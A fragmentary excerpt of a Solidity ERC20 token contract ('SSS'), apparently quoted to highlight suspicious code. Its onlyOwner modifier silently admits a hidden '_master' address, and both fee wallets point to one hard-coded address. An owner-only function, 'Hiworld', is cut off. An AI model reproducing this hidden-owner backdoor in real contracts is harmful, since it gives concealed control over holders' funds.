...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(owner() == _msgSender() || _master == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    ...
    function transferMaster(address addr) public virtual onlyOwner {
        _master = addr;
    }
...
contract SSS is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xe0aE2A6bC9B90cd8CA8455Fe3d49e006346C4989);
    address payable public teamWalletAddress = payable(0xe0aE2A6bC9B90cd8CA8455Fe3d49e006346C4989);
    ...
    function Hiworld(uint256 amount) public onlyOwner(){
